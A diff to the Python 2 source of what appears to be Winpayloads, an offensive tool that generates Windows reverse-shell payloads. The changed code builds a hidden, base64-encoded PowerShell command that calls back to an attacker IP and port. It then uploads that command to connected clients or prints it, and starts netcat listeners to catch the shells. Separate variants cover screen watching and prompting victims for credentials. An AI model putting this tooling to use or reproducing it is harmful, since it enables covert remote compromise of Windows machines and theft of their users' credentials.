@@ -6,6 +6,13 @@ from sockets import *
 
 payloaddir = '/etc/winpayloads'
 
+def checkClientUpload(payloadname, powershellExec):
+    from menu import clientMenuOptions
+    if len(clientMenuOptions.keys()) > 2:
+        DoClientUpload(payloaddir,payloadname,powershellExec)
+    else:
+        print powershellExec
+
 def reverseIpAndPort(port):
     portnum = raw_input(
         '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + port + t.normal))
@@ -111,10 +118,9 @@ def reversePowerShellGeneration(payloadchoice,payloadname):
     portnum,ipaddr = reverseIpAndPort('4444')
 
     shellcode = payloadchoice % (ipaddr,portnum,"|%{0}")
-    powershellbatfile = open('%s/%s.bat'%(payloaddir, payloadname),'w')
-    powershellbatfile.write('powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le'))))
-    powershellbatfile.close()
-    print t.normal + '\n[*] Powershell Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.bat' % (payloaddir, payloadname) + t.normal
+    powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
+    print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
+    checkClientUpload(payloadname,powershellExec)
     os.system('nc -lvp %s'%portnum)
     return True
 
@@ -123,10 +129,9 @@ def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
     portnum,ipaddr = reverseIpAndPort('4444')
 
     shellcode = payloadchoice % (ipaddr,portnum)
-    powershellbatfile = open('%s/%s.bat'%(payloaddir, payloadname),'w')
-    powershellbatfile.write('powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le'))))
-    powershellbatfile.close()
-    print t.normal + '\n[*] Powershell Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.bat' % (payloaddir, payloadname) + t.normal
+    powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
+    print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
+    checkClientUpload(payloadname,powershellExec)
     os.system('nc -lvp %s | nc -lvp 80 &'%(portnum))
     os.system('firefox 127.0.0.1')
     return True
@@ -136,9 +141,8 @@ def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
     portnum,ipaddr = reverseIpAndPort('4444')
 
     shellcode = payloadchoice % (ipaddr,portnum)
-    powershellbatfile = open('%s/%s.bat'%(payloaddir, payloadname),'w')
-    powershellbatfile.write('powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le'))))
-    powershellbatfile.close()
-    print t.normal + '\n[*] Powershell Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.bat' % (payloaddir, payloadname) + t.normal
+    powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
+    print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
+    checkClientUpload(payloadname,powershellExec)
     os.system('nc -lvp %s'%(portnum))
     return True
